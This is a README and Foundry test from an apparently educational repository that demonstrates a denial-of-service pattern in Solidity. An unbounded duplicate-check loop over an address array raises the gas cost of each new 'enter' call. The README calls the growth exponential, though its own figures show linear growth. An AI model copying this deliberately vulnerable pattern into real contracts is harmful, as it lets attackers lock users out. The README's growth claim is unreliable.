# DoS - increasing the gas costs exponentially 

## Installation 🛠️

1. Clone the repository:
```shell
git clone https://github.com/ionOM/smart-contract-attacks.git
```

2. Move to the loop folder:
```shell
cd smart-contract-attacks/denial-of-service/loop
```
3. When you are in the loop folder, type in the console:
```shell
forge test
```
## How this DoS work

We maintain an array named `entrance`, of type `address[]`, to store the addresses interacting with the contract. \
\
There exists a function called `enter` that permits an address to be added to the `entrance` array.\
\
Within this function, the contract verifies the `entrance` array for any duplicates of the address attempting to enter. If no duplicate is identified, the address is subsequently added to the `entrance` array.\
\
The more addresses are added into the array, more looping will be required for the duplication check, increasing the gas costs exponentially.

## Test
In our test, you can observe how drastically the gas costs have increased due to the DoS attack. The second person utilizing the `enter` function incurs lower gas fees than the third, and so forth. For instance, the second person pays `26146` in gas, the third person pays `26701`, the fourth person pays `27256`, and the 1005th person pays `582811` in gas. 

#### DOSLoopTest.t.sol
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {DOSLoop} from "src/DOSLoop.sol";

contract DOSLoopTest is Test {

    DOSLoop public loop;

    address warmUpAddress = makeAddr("warmUp");
    address person1 = makeAddr("1");
    address person2 = makeAddr("2");
    address person3 = makeAddr("3");
    address person1005 = makeAddr("1005");


    function setUp() public {
        loop = new DOSLoop();
    }

    function test_denial_of_service_loop() public {
        // We want to warm up the storage stuff
        vm.prank(warmUpAddress);
        loop.enter();

        uint256 gasStart1 = gasleft();
        vm.prank(person1);
        loop.enter();
        uint256 gasCost1 = gasStart1 - gasleft();

        uint256 gasStart2 = gasleft();
        vm.prank(person2);
        loop.enter();
        uint256 gasCost2 = gasStart2 - gasleft();

        uint256 gasStart3 = gasleft();
        vm.prank(person3);
        loop.enter();
        uint256 gasCost3 = gasStart3 - gasleft();

        for (uint256 i; i < 1000; i++) {
            vm.prank(address(uint160(i)));
            loop.enter();
        }

        uint256 gasStart1005 = gasleft();
        vm.prank(person1005);
        loop.enter();
        uint256 gasCost1005 = gasStart1005 - gasleft();

        console2.log("Gas cost 1: %s", gasCost1); // 26146 gas
        console2.log("Gas cost 2: %s", gasCost2); // 26701 gas
        console2.log("Gas cost 3: %s", gasCost3); // 27256 gas
        console2.log("Gas cost 1005: %s", gasCost1005); // 582811 gas

        // This gas cost will just keep rising, making it harder and harder for new people to enter
        assert(gasCost3 > gasCost2);
        assert(gasCost2 > gasCost1);
        assert(gasCost1005 > gasCost3);


    }
}
```
